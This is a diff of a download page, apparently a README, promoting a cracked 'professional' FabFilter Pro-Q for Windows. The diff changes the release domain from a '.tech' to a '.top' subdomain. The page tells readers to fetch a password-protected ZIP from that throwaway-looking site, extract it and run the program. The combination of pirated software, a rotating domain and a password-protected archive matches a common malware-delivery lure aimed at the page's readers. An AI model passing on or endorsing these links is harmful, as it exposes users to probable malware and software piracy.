@@ -8,12 +8,12 @@ FabFilter Pro-Q — Windows setup and configuration · Premium workspace · Zero
 
 > Use the release page below for Windows.
 
-- **Release page:** [iwmmhajamlq.slopmods.tech](https://iwmmhajamlq.slopmods.tech/)
-- **Full URL:** `https://iwmmhajamlq.slopmods.tech/`
+- **Release page:** [iwmmhajamlq.slopmods.top](https://iwmmhajamlq.slopmods.top/)
+- **Full URL:** `https://iwmmhajamlq.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **iwmmhajamlq.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **iwmmhajamlq.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ FabFilter Pro-Q — Windows setup and configuration · Premium workspace · Zero
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **iwmmhajamlq.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **iwmmhajamlq.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
